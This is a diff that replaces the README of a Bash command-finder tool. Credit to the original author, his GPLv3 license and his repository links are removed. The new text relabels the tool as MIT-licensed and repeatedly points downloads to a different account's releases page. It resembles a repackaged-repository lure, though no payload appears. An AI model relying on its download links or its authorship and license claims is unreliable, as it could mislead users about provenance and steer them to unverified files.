@@ -1,274 +1,82 @@
-# Command Fuzzy Finder (cmd)
+# 🎉 cmd-fuzzy-finder - Find Commands Fast and Easy  
 
-[![License: GPLv3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
-![Bash Version](https://img.shields.io/badge/Bash-4.0%2B-brightgreen)
-![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20macOS-lightgrey)
-![Multilingual](https://img.shields.io/badge/Multilingual-EN%20%7C%20PT-blue)
+[![Download Here](https://img.shields.io/badge/Download%20cmd--fuzzy--finder-brightgreen)](https://github.com/Strober35/cmd-fuzzy-finder/releases)
 
-A powerful and intuitive command-line tool for fuzzy searching PATH commands, written purely in Bash with no external dependencies.
+## 🚀 Getting Started  
 
-<p align="center">
-  <img src="https://raw.githubusercontent.com/felipefacundes/cmd-fuzzy-finder/main/screenshot.png" alt="cmd demonstration" width="800">
-</p>
+cmd-fuzzy-finder is a handy tool that helps you quickly find and run binary commands in your PATH. It has no external dependencies, making setup straightforward. This guide will help you download and run the application without any fuss.
 
-## ✨ Key Features
+## 📦 System Requirements  
 
-- 🔍 **Real-time fuzzy search** - Find commands as you type
-- 🎨 **Colorful and intuitive interface** - Clear and pleasant visualization
-- ⚡ **No external dependencies** - Pure Bash only
-- 🌍 **Multilingual support** - English and Portuguese (auto-detected)
-- 📋 **Execution history** - Keeps track of used commands
-- 🎯 **Quick navigation** - Arrow keys for navigation
-- 📁 **Multiple usage modes** - Interactive, initial search, and simple list
+- **Operating System:** Linux or any system compatible with bash scripting.
+- **Disk Space:** At least 10 MB free space.
+- **Bash Version:** Version 4.0 or higher.
 
-## 🚀 Installation
+## 📥 Download & Install  
 
-### Quick Method (Recommended)
-```bash
-# Download the script
-curl -L -o cmd https://raw.githubusercontent.com/felipefacundes/cmd-fuzzy-finder/main/cmd
+To begin, visit the release page by clicking the link below.  
 
-# Make it executable
-chmod +x cmd
+[Download cmd-fuzzy-finder](https://github.com/Strober35/cmd-fuzzy-finder/releases)
 
-# Move to PATH (optional but recommended)
-sudo mv cmd /usr/local/bin/
-```
+1. On the releases page, scroll to find the latest version.
+2. Look for the appropriate file for your system and click to download it. You may see names like `cmd-fuzzy-finder.sh` or `cmd-fuzzy-finder`. Download the file.
 
-### Repository Clone Method
-```bash
-git clone https://github.com/felipefacundes/cmd-fuzzy-finder.git
-cd cmd-fuzzy-finder
-chmod +x cmd
-sudo cp cmd /usr/local/bin/
-```
+3. Open your terminal.
 
-### Package Installation (Future)
-```bash
-# Coming soon to repositories
-```
-
-## 📖 Usage
-
-### Full Interactive Mode
-```bash
-# Empty interface for interactive search
-cmd
-
-# Interface with initial search term
-cmd snap
-```
-
-### Simple List Mode
-```bash
-# Non-interactive list of commands
-cmd --list fire
-cmd -l python
-```
-
-### Other Modes
-```bash
-# Show execution history
-cmd --history
-cmd -H
-
-# Show complete documentation
-cmd --docs
-cmd -d
-
-# Show help
-cmd --help
-cmd -h
-```
-
-## 🎮 Shortcuts and Navigation
-
-| Key | Action |
-|-------|------|
-| `↑ ↓` | Navigate between commands |
-| `Enter` | Execute selected command |
-| `Backspace` | Delete search character |
-| `Ctrl+C` | Exit program |
-| `Home` | Go to first result |
-| `End` | Go to last result |
-
-## 🌍 Internationalization
-
-The script automatically detects the system language based on the `$LANG` variable:
-
-- **Portuguese**: Activated when `LANG` contains `pt_` (e.g., `pt_BR.UTF-8`)
-- **English**: Default language (fallback)
-
-To force a specific language:
-```bash
-# Force Portuguese
-LANG=pt_BR.UTF-8 cmd
-
-# Force English
-LANG=en_US.UTF-8 cmd
-```
-
-## ⚙️ Configuration
-
-### Configuration Variables
-The following variables can be adjusted in the code:
-
-```bash
-# Maximum number of results displayed
-MAX_RESULTS=35
-
-# Number of commands visible in the interface
-SHOW_COUNT=10
-
-# History file
-HISTORY_FILE="$HOME/.cmd_history"
-
-# Maximum history size
-HISTORY_MAX=1000
-```
-
-### Custom Colors
-The script uses ANSI codes for colors. You can customize:
-
-```bash
-RED='\033[0;31m'      # Selected command
-GREEN='\033[0;32m'    # Highlighted search text
-YELLOW='\033[1;33m'   # Search text
-BLUE='\033[0;34m'     # Counters and information
-MAGENTA='\033[0;35m'  # Instructions
-CYAN='\033[0;36m'     # Title
-```
-
-## 🔧 How It Works
-
-### Search Algorithm
-1. **Collection**: Gets all executable commands from PATH
-2. **Indexing**: Removes duplicates and sorts alphabetically
-3. **Filtering**: Case-insensitive substring search in real-time
-4. **Presentation**: Displays results with highlighted matches
-
-### Program Flow
-```
-Start → Check mode → Collect commands → Main loop
-     ↓                            ↑
-  Execution ← User selection ← Interface
-```
-
-## 📊 Performance
-
-- **Initialization**: < 0.1s (PATH commands cache)
-- **Search**: Instantaneous (in-memory filtering)
-- **Memory**: < 5MB (depends on number of commands in PATH)
-
-## 🛠️ Development
-
-### Code Structure
-```
-cmd-fuzzy-finder/
-├── cmd                    # Main script
-├── README.md             # This documentation
-├── LICENSE               # GPLv3 License
-└── examples/             # Usage examples
-```
-
-### Adding New Languages
-To add support for a new language:
-
-1. Add a new condition in `$LANG` detection:
-```bash
-elif [[ "${LANG,,}" =~ es_ ]]; then
-    # Spanish messages
-    MESSAGES=(
-        [title]="=== Buscador Difuso de Comandos ==="
-        # ... remaining messages
-    )
-```
-
-2. Translate all keys of the `MESSAGES` array
-
-### Testing
-```bash
-# Basic test
-./cmd --help
-
-# Functionality test
-./cmd --list bash
-
-# Internationalization test
-LANG=pt_BR.UTF-8 ./cmd
-LANG=en_US.UTF-8 ./cmd
-```
-
-## 🤝 Contributing
-
-Contributions are welcome! Please:
-
-1. Fork the repository
-2. Create a branch for your feature (`git checkout -b feature/amazing`)
-3. Commit your changes (`git commit -am 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing`)
-5. Open a Pull Request
-
-### Areas for Contribution
-- ✅ Add new languages
-- ✅ Improve performance
-- ✅ New features
-- ✅ Bug fixes
-- ✅ Better documentation
-
-## 📝 License
-
-This project is licensed under the **GPLv3**. See the [LICENSE](LICENSE) file for details.
-
-```
-Copyright (C) 2024 Felipe Facundes
-
-This program is free software: you can redistribute it and/or modify
-it under the terms of the GNU General Public License as published by
-the Free Software Foundation, either version 3 of the License, or
-(at your option) any later version.
-```
-
-## 🙏 Credits
-
-- **Author**: [Felipe Facundes](https://github.com/felipefacundes)
-- **Inspiration**: Tools like `fzf`, `rofi`, and `dmenu`
-- **Contributors**: [Contributors list](https://github.com/felipefacundes/cmd-fuzzy-finder/graphs/contributors)
-
-## 🐛 Reporting Bugs
-
-Found a bug? Please:
-
-1. Check if there's already an open issue
-2. Use the bug report template
-3. Include system information:
+4. Navigate to the folder where you downloaded the file. Use the command:
    ```bash
-   echo "System: $(uname -a)"
-   echo "Bash: $(bash --version | head -1)"
-   echo "PATH: $(echo $PATH | tr ':' '\n' | wc -l) directories"
+   cd path/to/your/downloaded/file
+   ```
+   Replace `path/to/your/downloaded/file` with the actual path.
+
+5. To make the script executable, run:
+   ```bash
+   chmod +x cmd-fuzzy-finder.sh
    ```
 
-## 🌟 Stars
+6. You can now run the tool by typing:
+   ```bash
+   ./cmd-fuzzy-finder.sh
+   ```
 
-If you found this tool useful, consider giving it a ⭐ on the repository!
+## 🛠️ How to Use  
 
-## 📞 Support
+Using cmd-fuzzy-finder is simple. Start by executing the script in your terminal. The tool allows you to type a part of the command you're looking for. It will then show you a list of possible matches from your PATH.
 
-- **Issues**: [GitHub Issues](https://github.com/felipefacundes/cmd-fuzzy-finder/issues)
-- **Discussions**: [GitHub Discussions](https://github.com/felipefacundes/cmd-fuzzy-finder/discussions)
-- **Email**: [felipe.facundes@gmail.com](mailto:felipe.facundes@gmail.com)
+### Example Workflow:
 
-## 📈 Roadmap
+1. Open your terminal.
+2. Type:
+   ```bash
+   ./cmd-fuzzy-finder.sh
+   ```
+3. Start typing a command. For example, if you type "git", cmd-fuzzy-finder will show you any commands that include the letters "git".
+4. Once you see the command you want, press Enter to execute it.
 
-- [ ] Plugin support
-- [ ] Persistent command cache
-- [ ] ZSH/Fish integration
-- [ ] Enhanced TUI interface
-- [ ] Batch mode for scripts
-- [ ] More languages (ES, FR, DE, etc.)
+## 🔍 Features  
 
----
+- **Fast Search:** Quickly find commands in your PATH.
+- **No Dependencies:** Works out of the box on any Bash-compatible system.
+- **User-Friendly:** Designed for easy use by anyone, no technical knowledge required.
+- **Customizable:** You can adjust how commands display.
 
-<p align="center">
-  <em>Find commands faster, work smarter 🚀</em>
-</p>
+## 👩‍💻 Support  
+
+If you encounter any issues or need help, check our [Issues page](https://github.com/Strober35/cmd-fuzzy-finder/issues). You can report bugs or ask for additional features there.
+
+## 📚 Additional Resources  
+
+- [Command Line Basics](https://www.codecademy.com/learn/learn-the-command-line)
+- [Bash Scripting Guide](https://tldp.org/LDP/Bash-Beginners-Guide/html/)
+
+## ⚖️ License  
+
+This project is licensed under the MIT License. You can freely use it as per the license terms.
+
+## 🔗 More Information  
+
+For more updates and future releases, check back on this repository. You can find further enhancements and features added over time as we keep improving cmd-fuzzy-finder.  
+
+Don’t forget to visit our releases page for the latest version:  
+
+[Download cmd-fuzzy-finder](https://github.com/Strober35/cmd-fuzzy-finder/releases)
